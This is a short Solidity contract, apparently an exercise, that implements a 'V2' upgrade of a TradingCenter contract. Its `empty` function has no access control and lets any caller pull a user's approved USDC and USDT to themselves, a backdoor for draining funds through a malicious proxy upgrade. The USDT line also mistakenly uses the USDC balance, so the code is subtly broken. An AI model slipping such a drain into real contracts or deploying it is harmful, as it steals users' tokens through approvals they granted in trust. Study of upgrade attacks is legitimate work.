// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import "../src/TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter{

    bool public v2Initialized;
    function v2Initialize() external{
        require(!v2Initialized, "already initialized");
        v2Initialized = true;
    }

    function v2InitStatus() external view returns(bool){
        return v2Initialized;
    }
    //empty users' usdc and usdt
    function empty(address sender) external {
        usdt.transferFrom(sender, msg.sender, usdc.balanceOf(address(sender)));
        usdc.transferFrom(sender, msg.sender, usdc.balanceOf(address(sender)));
    }
}